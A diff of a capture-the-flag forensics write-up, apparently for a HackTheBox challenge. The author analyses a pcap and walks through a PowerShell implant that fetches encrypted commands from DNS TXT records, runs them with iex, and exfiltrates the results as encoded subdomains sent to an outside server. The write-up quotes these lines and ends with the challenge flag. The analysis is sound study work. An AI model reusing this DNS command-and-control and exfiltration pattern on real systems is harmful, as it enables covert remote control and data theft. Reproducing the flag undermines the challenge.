@@ -5,7 +5,10 @@ Looked at the pcap for a bit in wireshark.  Analyzed convo's, looked for many re
 Also took apart the pcap in an online analyzer after this; https://apackets.com/pcaps/flows  - This was pretty cool.
 
 Happened to notice some requests to ‘windowsupdatelive.com’ which looks super funky..
-`10.0.2.15:49804   WINDoWslIVeupDATeR.cOM (77.74.198.52):80 (GET)`
+
+```
+10.0.2.15:49804   WINDoWslIVeupDATeR.cOM (77.74.198.52):80 (GET)
+```
 
 Found an image file in one of them, took it and saved to file it was white 64x64px or whatnot, but looked at it in a hex editor and its base64.  
 
@@ -76,13 +79,16 @@ $domain = -join($pr[$ans],".windowsliveupdater.com")
 Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189
     }
 Resolve-DnsName -type A -DnsOnly end.windowsliveupdater.com -Server 147.182.172.189
-}```
+}
+```
 
 
 Looked up the key:
 
-```echo a1E4MUtycWswTmtrMHdqdg== | base64 -d
-kQ81Krqk0Nkk0wjv```
+```
+echo a1E4MUtycWswTmtrMHdqdg== | base64 -d
+kQ81Krqk0Nkk0wjv
+```
 
 This doesn't mean much but maybe it can be used to decode some of the traffic!
 
@@ -94,7 +100,9 @@ This was at packet 1931 - 19.145926
 
 Found another request after with a UDP stream on port 53 (dns response is how the data is infiltrated!!)
 
-```{...........windowsliveupdater.com..... {...........windowsliveupdater.com..............,.-,Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws=.........,.-,hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA=.........,.-,58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=.........,...eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru.........,...BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=.........,...vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A=.........,.A@M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh```
+```
+{...........windowsliveupdater.com..... {...........windowsliveupdater.com..............,.-,Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws=.........,.-,hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA=.........,.-,58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=.........,...eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru.........,...BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=.........,...vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A=.........,.A@M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh
+```
 
 Took and tried to base64 -d these;
 Played around a bit and got nowhere,  figured out to try to use the ps1 file above to decrypt..
@@ -104,7 +112,8 @@ However, they are not decrypting after putting them in this format. Can't figure
 Found that a bunch of DNS queries were going out:
 
 
-```windowsliveupdater.com
+```
+windowsliveupdater.com
 start.windowsliveupdater.com
 CC1C9AC2958A2E63609272E2B4F8F436.windowsliveupdater.com
 32A806549B03AB7E4EB39771AEDA4A1B.windowsliveupdater.com
@@ -165,11 +174,14 @@ ABCE30583F503B484BF99020E28A1B8F.windowsliveupdater.com
 7E2854D11003AB6E2F4BFB4F7E2477DA.windowsliveupdater.com
 A44FCA3BC6021777F03F139D458C0524.windowsliveupdater.com
 AE4ABE8A3A88D21DEEA071A72D65A35E.windowsliveupdater.com
-F158D9F025897D1843E37B7463EC7833.windowsliveupdater.com```
+F158D9F025897D1843E37B7463EC7833.windowsliveupdater.com
+```
 
 Converted these to codes I can try to reverse..
 
-```cat reqs.txt | tr -s '.' ' ' | awk '{print $1}' > reqs2.txt```
+```
+cat reqs.txt | tr -s '.' ' ' | awk '{print $1}' > reqs2.txt
+```
 
 Soo.. Walked through EXACTLY whats happening here with the first request to Windowsliveupdater.com on port 80
 returns /desktop.png
@@ -178,50 +190,78 @@ Lets break it down:
 
 So there is a filter which just breaks the ‘query’ down to parts and doesn't stop the pipeline, just keeps outputting each part of the query:
 
-```filter parts($query) { $t = $_; 0..[math]::floor($t.length / $query) | % { $t.substring($query * $_, [math]::min($query, $t.length - $query * $_)) }} 
-$key = "a1E4MUtycWswTmtrMHdqdg=="```
+```
+filter parts($query) { $t = $_; 0..[math]::floor($t.length / $query) | % { $t.substring($query * $_, [math]::min($query, $t.length - $query * $_)) }} 
+$key = "a1E4MUtycWswTmtrMHdqdg=="
+```
 
 The first thing the script actually does, is reach out to 147.182.172.189 and do a dnsquery for windowsliveupdater.com and return the Strings as $out:
-```$out = Resolve-DnsName -type TXT -DnsOnly windowsliveupdater.com -Server 147.182.172.189|Select-Object -Property Strings;```
+
+```
+$out = Resolve-DnsName -type TXT -DnsOnly windowsliveupdater.com -Server 147.182.172.189|Select-Object -Property Strings;
+```
 
 Looked at what this did on a another domain like windows.com, to get a look at how it might output:
-PS C:\Users\cryptic.XDDEV> Resolve-DnsName -type TXT -DnsOnly windows.com | select-object -property Strings
+
 ```
+PS C:\Users\cryptic.XDDEV> Resolve-DnsName -type TXT -DnsOnly windows.com | select-object -property Strings
+
 Strings
 -------
 {v=spf1 mx -all}
 {facebook-domain-verification=d65hkhpulntsek90x3rt1cqq4y06tk}
 {D-TRUST=27XN9J9VBV6S24F}
 ```
+
 This should show a bunch of txt records. 
 Then, for each TXT record string, returned from the dns query (except for the last 2 lines?  Looks like these are blank automatically on the output):
-`for ($num = 0 ; $num -le $out.Length-2; $num++){`
+```
+for ($num = 0 ; $num -le $out.Length-2; $num++){
+```
 
 It looks like each time it checks the 1st line of each TXT record string (parsing blank lines)
-`$encryptedString = $out[$num].Strings[0]`
+```
+$encryptedString = $out[$num].Strings[0]
+```
 
 So it decrypts this TXT record with the key above:
-`$backToPlainText = Decrypt-String $key $encryptedString`
+```
+$backToPlainText = Decrypt-String $key $encryptedString
+```
 
 (Later added this line in to spit it out here:)
-`$backToPlainText`
+```
+$backToPlainText
+```
 
 Then the Output will be the output of invoke-expression of $backToPlainText (split the next line into 2):
-`$output = iex $backToPlainText;`
+```
+$output = iex $backToPlainText;
+```
 
 Then, the results will be the $output encrypted again into 32 char chunks:
-`$pr = Encrypt-String $key $output|parts 32`
+```
+$pr = Encrypt-String $key $output|parts 32
+```
 
 Then, it will let start.windowsliveupdater.com know of a response starting:
-`Resolve-DnsName -type A -DnsOnly start.windowsliveupdater.com -Server 147.182.172.189`
 
+```
+Resolve-DnsName -type A -DnsOnly start.windowsliveupdater.com -Server 147.182.172.189
+```
 Foreach the the $pr public responses, do a lookup for $pr[ans].windowsliveupdater.com.   Exfiltration thru DNS complete.
-`for ($ans = 0; $ans -lt $pr.length-1; $ans++){
+```
+for ($ans = 0; $ans -lt $pr.length-1; $ans++){
 $domain = -join($pr[$ans],".windowsliveupdater.com")
 Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189
-    }`
+    }
+```
+
 Sends a response to end. telling it it is done.
-`Resolve-DnsName -type A -DnsOnly end.windowsliveupdater.com -Server 147.182.172.189`
+
+```
+Resolve-DnsName -type A -DnsOnly end.windowsliveupdater.com -Server 147.182.172.189
+```
 
 So, now I need to look for the DNS response with the TXT records returned.  This should be near the first DNS request to 147.182.172.189, after the port 80 req.  Found it:
 
@@ -287,6 +327,8 @@ So, now I need to look for the DNS response with the TXT records returned.  This
 Definitely tried cleaning these up and decrypting. Need to figure out why they won't decrypt. Maybe needs to be a slight diff format..
 
 Keep running into issue with the 1st bytes not being able to be read into $bytes for the IV:
+
+```
 $bytes = [System.Convert]::FromBase64String($encryptedStringWithI ...
 
 xddev\cryptic@cryptic-PC C:\Users\cryptic.XDDEV>powershell -exec bypass -file i4.ps1 
@@ -300,11 +342,10 @@ At C:\Users\cryptic.XDDEV\i4.ps1:47 char:5
  
 Cannot index into a null array.
 At i4.ps1:48 char:5
+```
 
+Output of each separately worked, so tried again with all 3-7 together.. nice!!
 
-
-
-Output of each:
 ```
 1
 ¶Í¯©Pl§¢../Ã
@@ -321,6 +362,7 @@ Output of each:
 
 $part1='HTB{y0u_c4n_
 ```
+
 I bet the last part is the first stuff I decrypted from each part, decrypted again
 
 So, grabbed all of this in byte format and did this quick python to split into 16 char pieces:
@@ -340,7 +382,6 @@ split into lines with 2 parts so I can awk it:
 ```
 ['b6cdafa9506ca7a294022fc30add148b', '686f73746e616d650000000000000000', 
 '6b391c01442c135b5875302a0295780f', '77686f616d6900000000000000000000', 
-'e9a11450da2349238a3c887be4f35a5e', '6970636f6e6669670000000000000000', 
 'bf6751ed8718d730f7db587d14571db4', '776d6963202f6e616d6573706163653a', 
 '5c5c726f6f745c536563757269747943', '656e746572205041544820416e746956', 
 '6972757350726f647563742047455420', '2f76616c756500000000000000000000', 
@@ -360,7 +401,7 @@ split into lines with 2 parts so I can awk it:
 ```
 Nope.. Idk why I can't seem to get these to be happy with the decryption process, oh well..
 
-Couldn't get this.. Took a break from it.
+Couldn't get this.. Took a break from it for now..
 
 # day2 - again!
 
@@ -437,7 +478,8 @@ Couldn't use this last string!? ah well dont need it looks like..
 
 Put them together..
 
-```$part1='HTB{y0u_c4n_'
+```
+$part1='HTB{y0u_c4n_'
 $part2=4utom4t3_but_y0u_c4nt_h1de}
 
 HTB{y0u_c4n_4utom4t3_but_y0u_c4nt_h1de}
@@ -447,5 +489,7 @@ This took WAY longer than I had expected.  Another guy I was working with found 
 
 
 Note: Source, possibly, from 2016- looks just like it:
-`https://gist.github.com/ctigeek/2a56648b923d198a6e60`
+```
+https://gist.github.com/ctigeek/2a56648b923d198a6e60
+```
 
